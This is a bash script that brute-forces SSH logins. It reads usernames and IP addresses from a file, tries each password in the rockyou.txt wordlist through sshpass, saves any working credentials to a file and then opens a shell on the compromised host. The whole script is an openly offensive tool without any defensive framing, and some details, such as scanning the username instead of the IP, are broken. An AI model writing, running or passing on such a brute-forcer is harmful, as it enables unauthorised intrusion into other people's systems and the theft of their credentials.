
Red=$'\e[1;31m'
Green=$'\e[1;32m'
Blue=$'\e[1;34m'
Yellow=$'\e[1;33m'
Reset=$'\e[0,m'


login () { #user, ip
	output=output.txt

	nmap $1 -p 22
	if [ $? -eq 0 ];
		then
			pass=""
			while read line;
			do
				if sshpass -p "$line" ssh -t -t $1@$2 -p 22 "set -- '$SSHPATH/$ID'.*; [ -e \"\$1\" ]";
					then
						pass="$line"
						echo "$Yellow ##################################################### $Reset"
						echo "$Green Login Successful  $Reset"
						echo "$Yellow ##################################################### $Reset"
						echo "$1 $pass $2" | tee -a $output
						break
				fi
			done < rockyou.txt
			sshpass -p "$pass" ssh -t -t "$1"@"$2" -p 22
		else
			echo "$Red Port is closed!!!  $Reset"
	fi

}



while read -r line;
do
	IFS=" " read -ra ADDR <<<"$line"

	for i in "${ADDR[0]}";
	do
	USER="$i"
	done

	for i in "${ADDR[1]}";
	do
	IP="$i"
	done

	echo "$Blue Attempting to login to $USER... $Reset"
	login $USER $IP &

done < input.txt
exit
